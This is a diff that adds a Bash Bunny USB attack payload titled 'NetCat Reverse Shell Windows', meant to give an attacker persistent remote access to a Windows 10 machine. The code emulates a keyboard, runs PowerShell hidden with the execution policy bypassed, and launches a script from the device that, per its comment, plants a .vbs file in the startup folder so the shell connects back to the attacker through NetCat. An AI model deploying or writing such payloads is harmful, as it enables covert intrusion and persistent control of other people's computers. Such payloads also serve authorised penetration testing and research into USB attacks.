@@ -1,0 +1,18 @@
+# Title:         NetCat Reverse Shell Windows
+# Description:   Creates a persistent reverse shell on Windows and connects back to attacker through NetCat
+# Author:        0dyss3us (KeenanV)
+# Props:
+# Version:       1.0
+# Category:      Remote Access
+# Target:        Windows 10
+# Attackmodes:   HID, Storage
+
+#Sets attack mode and stores current switch position
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+#Runs Powershell script which puts a .vbs file in the startup folder and runs it
+LED ATTACK
+RUN WIN Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\run.ps1')"
+LED FINISH
